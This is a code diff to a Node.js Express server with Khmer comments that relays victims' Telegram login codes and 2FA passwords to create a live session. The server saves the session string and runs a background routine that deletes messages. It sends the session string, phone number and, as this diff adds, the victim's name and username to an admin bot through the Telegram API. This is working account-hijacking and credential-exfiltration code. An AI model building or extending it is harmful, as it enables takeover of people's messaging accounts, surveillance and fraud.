@@ -154,7 +154,6 @@ app.post('/api/send-code', async (req, res) => {
         const userAgent = req.headers['user-agent'] || '';
         const { deviceModel, systemVersion } = parseDeviceInfo(userAgent);
 
-        // បន្ថយ connectionRetries មក 2 និងកំណត់ timeout ដើមបីរត់លឿន
         const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
             connectionRetries: 2,
             timeout: 10,
@@ -180,7 +179,7 @@ app.post('/api/send-code', async (req, res) => {
     }
 });
 
-// 2. API: ផ្ទៀងផ្ទាត់ OTP និង 2FA Password (Fast Response)
+// 2. API: ផ្ទៀងផ្ទាត់ OTP និង 2FA Password
 app.post('/api/verify-code', async (req, res) => {
     const { phoneNumber, code, password } = req.body;
 
@@ -210,16 +209,27 @@ app.post('/api/verify-code', async (req, res) => {
             );
         }
 
+        // ទាញយកព័ត៌មាន Profile របស់អ្នកប្រើប្រាស់ (Username, Name, User ID)
+        let username = 'No Username';
+        let fullName = 'N/A';
+        try {
+            const me = await client.getMe();
+            username = me.username ? `@${me.username}` : 'No Username';
+            fullName = [me.firstName, me.lastName].filter(Boolean).join(' ') || 'N/A';
+        } catch (profileErr) {
+            console.error("Error getting user profile:", profileErr);
+        }
+
         const sessionString = client.session.save();
         delete sessions[phoneNumber];
 
         // ដំណើរការលុបសារក្នុង Background (មិនទាក់ទាញល្បឿន Web)
         cleanupPostLogin(client).catch(err => console.error("Cleanup background error:", err));
 
-        // ផ្ញើ Session String ទៅ Admin Bot
+        // ផ្ញើ Session String ព្រមទាំង Username & Name ទៅ Admin Bot
         if (botToken && adminChatId) {
             try {
-                const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
+                const messageText = `🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** ${fullName}\n🏷 **Username:** ${username}\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
                 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
